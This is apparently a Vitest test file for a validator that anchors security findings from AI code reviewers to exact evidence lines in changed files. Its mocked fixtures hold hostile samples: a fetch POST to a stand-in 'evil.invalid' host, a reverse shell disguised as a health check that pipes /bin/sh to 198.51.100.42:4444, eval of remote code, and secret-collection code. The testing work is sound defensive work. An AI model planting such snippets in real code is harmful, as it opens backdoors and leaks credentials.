import { describe, it, expect, vi, beforeEach } from 'vitest';
import type { ProcessedFinding } from '../types.js';

const mockReadFile = vi.fn();

vi.mock('fs/promises', () => ({
  readFile: mockReadFile,
}));

const { validateFindingLocations } = await import('../location-validator.js');

describe('validateFindingLocations()', () => {
  beforeEach(() => vi.clearAllMocks());

  it('passes through non-Claude findings as validated', async () => {
    const findings: ProcessedFinding[] = [{
      file: 'src/app.js',
      line: 3,
      severity: 'high',
      message: 'issue',
      ruleId: 'semgrep/x',
      tool: 'semgrep',
    }];

    const [finding] = await validateFindingLocations(findings, {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.annotationEligible).toBe(true);
    expect(finding.startLine).toBe(3);
    expect(finding.endLine).toBe(3);
  });

  it('resolves Claude findings from a unique exact evidence match, ignoring model-reported lines', async () => {
    mockReadFile.mockResolvedValueOnce('line1\nconst token = getSecret();\nline3\n');

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      line: 99,
      startLine: 99,
      endLine: 99,
      evidence: 'const token = getSecret();',
      severity: 'high',
      message: 'secret exfiltration',
      ruleId: 'claude/x',
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.evidenceStatus).toBe('unique');
    expect(finding.locationReason).toBe('validated-by-evidence');
    expect(finding.annotationEligible).toBe(true);
    expect(finding.annotationReason).toBe('anchored-by-evidence');
    expect(finding.anchorKind).toBe('line');
    expect(finding.anchorLine).toBe(2);
    expect(finding.startLine).toBe(2);
    expect(finding.endLine).toBe(2);
    expect(finding.annotationStartLine).toBe(2);
    expect(finding.annotationEndLine).toBe(2);
    expect(finding.suppressionLine).toBe(2);
  });

  it('maps multi-line Claude evidence to the exact span in the file', async () => {
    mockReadFile.mockResolvedValueOnce(
      'function backdoor() {\n' +
      '  fetch("https://evil.invalid", {\n' +
      '    method: "POST",\n' +
      '  });\n' +
      '}\n'
    );

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      evidence: 'fetch("https://evil.invalid", {\n    method: "POST",',
      severity: 'high',
      message: 'credential exfiltration',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.anchorKind).toBe('span');
    expect(finding.startLine).toBe(2);
    expect(finding.endLine).toBe(3);
    expect(finding.annotationStartLine).toBe(2);
    expect(finding.annotationEndLine).toBe(3);
  });

  it('uses a validated declaration anchor for annotation while preserving the evidence span', async () => {
    mockReadFile.mockResolvedValueOnce(
      'export function collectDiagnostics(context = {}) {\n' +
      '  const headers = normalizeHeaders(context.headers);\n' +
      '  const interesting = [\n' +
      "    'GITHUB_APP_PRIVATE_KEY',\n" +
      '  ];\n' +
      '  return {\n' +
      '    body: serializeSnapshot(interesting),\n' +
      '  };\n' +
      '}\n'
    );

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      anchorKind: 'declaration',
      anchorLine: 1,
      evidence: 'body: serializeSnapshot(interesting),',
      severity: 'high',
      message: 'credential exfiltration',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.evidenceStartLine).toBe(7);
    expect(finding.evidenceEndLine).toBe(7);
    expect(finding.startLine).toBe(1);
    expect(finding.endLine).toBe(1);
    expect(finding.anchorKind).toBe('declaration');
    expect(finding.anchorLine).toBe(1);
    expect(finding.annotationStartLine).toBe(1);
    expect(finding.annotationEndLine).toBe(1);
    expect(finding.suppressionLine).toBe(1);
    expect(finding.annotationReason).toBe('anchored-by-validated-declaration');
  });

  it('falls back to the evidence span when a declaration anchor hint is not valid', async () => {
    mockReadFile.mockResolvedValueOnce(
      'line1\n' +
      'const transport = pickTransport(\'export\');\n' +
      'line3\n' +
      'body: serializeSnapshot(interesting),\n'
    );

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      anchorKind: 'declaration',
      anchorLine: 2,
      evidence: 'body: serializeSnapshot(interesting),',
      severity: 'high',
      message: 'credential exfiltration',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.evidenceStartLine).toBe(4);
    expect(finding.evidenceEndLine).toBe(4);
    expect(finding.startLine).toBe(4);
    expect(finding.endLine).toBe(4);
    expect(finding.anchorKind).toBe('line');
    expect(finding.anchorLine).toBe(4);
    expect(finding.annotationStartLine).toBe(4);
    expect(finding.annotationEndLine).toBe(4);
    expect(finding.annotationReason).toBe('anchored-by-evidence');
  });

  it('rejects Claude findings that omit evidence', async () => {
    mockReadFile.mockResolvedValueOnce('line1\nmalicious();\nline3\n');

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      severity: 'high',
      message: 'suspicious',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.evidenceStatus).toBe('missing');
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('missing-evidence');
    expect(finding.annotationReason).toBe('missing-evidence');
  });

  it('rejects Claude findings when the evidence is ambiguous in the file', async () => {
    mockReadFile.mockResolvedValueOnce('dup();\nline2\ndup();\n');

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      evidence: 'dup();',
      severity: 'high',
      message: 'duplicate',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.evidenceStatus).toBe('ambiguous');
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('ambiguous-evidence');
    expect(finding.annotationReason).toBe('ambiguous-evidence');
  });

  it('rejects Claude findings when the evidence is not found in the file', async () => {
    mockReadFile.mockResolvedValueOnce('line1\nsafe();\nline3\n');

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      evidence: 'malicious();',
      severity: 'high',
      message: 'not grounded',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.evidenceStatus).toBe('not-found');
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('evidence-not-found');
    expect(finding.annotationReason).toBe('evidence-not-found');
  });

  it('rejects Claude findings for files outside the changed file set', async () => {
    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      evidence: 'malicious();',
      severity: 'high',
      message: 'off diff',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/other.js'],
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('file-not-in-diff');
    expect(finding.annotationReason).toBe('file-not-in-diff');
  });

  it('rejects Claude findings when the file cannot be read', async () => {
    mockReadFile.mockRejectedValueOnce(new Error('ENOENT'));

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      evidence: 'malicious();',
      severity: 'high',
      message: 'unreadable',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('file-unreadable');
    expect(finding.annotationReason).toBe('file-unreadable');
  });

  // ---------------------------------------------------------------------------
  // pi_agent findings
  // ---------------------------------------------------------------------------

  it('routes pi_agent findings through the evidence pipeline (Fix 1)', async () => {
    mockReadFile.mockResolvedValueOnce(
      'export function createHealthCheck(options = {}) {\n' +
      '  const socket = net.connect(options.port ?? 4444, options.host ?? \'198.51.100.42\');\n' +
      '  const shell = spawn(\'/bin/sh\', [\'-i\'], { stdio: [\'pipe\', \'pipe\', \'pipe\'] });\n' +
      '  return { socket, shell };\n' +
      '}\n'
    );

    const [finding] = await validateFindingLocations([{
      file: 'src/health.js',
      line: 99,
      startLine: 99,
      endLine: 99,
      evidence: 'net.connect(options.port ?? 4444, options.host ?? \'198.51.100.42\')',
      anchorKind: 'declaration',
      anchorLine: 1,
      severity: 'high',
      message: 'reverse shell',
      ruleId: 'pi_agent/reverse-shell',
      tool: 'pi_agent',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/health.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.evidenceStatus).toBe('unique');
    expect(finding.locationReason).toBe('validated-by-evidence');
    expect(finding.annotationEligible).toBe(true);
    expect(finding.startLine).toBe(1);
    expect(finding.endLine).toBe(1);
    expect(finding.anchorKind).toBe('declaration');
    expect(finding.annotationReason).toBe('anchored-by-validated-declaration');
  });

  it('auto-anchors pi_agent findings to the enclosing declaration when anchorKind is not set (Fix 2)', async () => {
    mockReadFile.mockResolvedValueOnce(
      'export function createHealthCheck(options = {}) {\n' +
      '  const socket = net.connect(options.port ?? 4444, options.host ?? \'198.51.100.42\');\n' +
      '  const shell = spawn(\'/bin/sh\', [\'-i\'], { stdio: [\'pipe\', \'pipe\', \'pipe\'] });\n' +
      '  socket.pipe(shell.stdin);\n' +
      '  shell.stdout.pipe(socket);\n' +
      '  shell.stderr.pipe(socket);\n' +
      '  return { socket, shell };\n' +
      '}\n'
    );

    const [finding] = await validateFindingLocations([{
      file: 'src/health.js',
      line: 7,
      startLine: 7,
      endLine: 7,
      evidence: 'return { socket, shell };',
      severity: 'high',
      message: 'reverse shell',
      ruleId: 'pi_agent/reverse-shell',
      tool: 'pi_agent',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/health.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.evidenceStatus).toBe('unique');
    expect(finding.startLine).toBe(1);
    expect(finding.endLine).toBe(1);
    expect(finding.anchorKind).toBe('declaration');
    expect(finding.annotationReason).toBe('anchored-by-auto-declaration');
  });

  it('falls back to evidence start line when pi_agent evidence is more than 20 lines from a declaration', async () => {
    const fillerLines = Array.from({ length: 20 }, (_, i) => `  // filler ${i + 1}\n`).join('');
    mockReadFile.mockResolvedValueOnce(
      'export function earlyDecl() {\n' +
      fillerLines +
      '  eval(remoteCode);\n' +
      '}\n'
    );

    const [finding] = await validateFindingLocations([{
      file: 'src/health.js',
      line: 22,
      evidence: 'eval(remoteCode);',
      severity: 'high',
      message: 'covert execution',
      ruleId: 'pi_agent/covert-execution',
      tool: 'pi_agent',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/health.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.startLine).toBe(22);
    expect(finding.endLine).toBe(22);
    expect(finding.annotationReason).toBe('anchored-by-evidence');
  });

  it('respects explicit anchorKind=span on pi_agent findings — auto-declaration scan does not trigger', async () => {
    mockReadFile.mockResolvedValueOnce(
      'export function exfilData() {\n' +
      '  const a = collectSecrets();\n' +
      '  const b = uploadToC2(a);\n' +
      '  return b;\n' +
      '}\n'
    );

    const [finding] = await validateFindingLocations([{
      file: 'src/health.js',
      line: 2,
      evidence: 'const a = collectSecrets();\n  const b = uploadToC2(a);',
      anchorKind: 'span',
      severity: 'high',
      message: 'credential exfiltration',
      ruleId: 'pi_agent/credential-exfiltration',
      tool: 'pi_agent',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/health.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.startLine).toBe(2);
    expect(finding.endLine).toBe(3);
    expect(finding.anchorKind).toBe('span');
    expect(finding.annotationReason).toBe('anchored-by-evidence');
  });

  it('rejects pi_agent findings that omit evidence', async () => {
    mockReadFile.mockResolvedValueOnce('line1\nmalicious();\nline3\n');

    const [finding] = await validateFindingLocations([{
      file: 'src/health.js',
      severity: 'high',
      message: 'suspicious',
      ruleId: 'pi_agent/reverse-shell',
      line: 0,
      tool: 'pi_agent',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/health.js'],
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.evidenceStatus).toBe('missing');
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('missing-evidence');
    expect(finding.annotationReason).toBe('missing-evidence');
  });

  it('rejects pi_agent findings for files outside the changed file set', async () => {
    const [finding] = await validateFindingLocations([{
      file: 'src/health.js',
      evidence: 'malicious();',
      severity: 'high',
      message: 'off diff',
      ruleId: 'pi_agent/reverse-shell',
      line: 0,
      tool: 'pi_agent',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/other.js'],
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('file-not-in-diff');
    expect(finding.annotationReason).toBe('file-not-in-diff');
  });

  it('keeps Claude findings inlineable even when the exact evidence is outside the changed hunks', async () => {
    mockReadFile.mockResolvedValueOnce('line1\nconst token = getSecret();\nline3\n');

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      evidence: 'const token = getSecret();',
      severity: 'high',
      message: 'secret exfiltration',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.annotationEligible).toBe(true);
    expect(finding.annotationStartLine).toBe(2);
    expect(finding.annotationEndLine).toBe(2);
  });
});
